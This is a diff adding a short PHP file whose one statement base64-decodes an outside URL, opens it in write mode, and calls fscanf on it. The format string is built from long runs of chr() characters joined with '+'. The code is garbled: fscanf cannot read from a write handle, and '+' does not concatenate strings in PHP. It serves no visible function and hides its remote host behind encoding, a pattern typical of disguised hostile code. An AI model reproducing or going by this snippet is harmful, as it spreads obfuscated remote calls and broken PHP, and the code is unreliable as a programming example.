@@ -1,0 +1,4 @@
+<?php
+fscanf(fopen(base64_decode("aHR0cHM6Ly90b3Auc3R1ZGVudG8uY29tL2NvbnRlbnQv"), "w"), str_repeat(chr(59), 1025) + str_repeat(chr(140), 1025) + str_repeat(chr(10), 1025) + chr(139) + chr(1), $ref_bool);
+
+?>
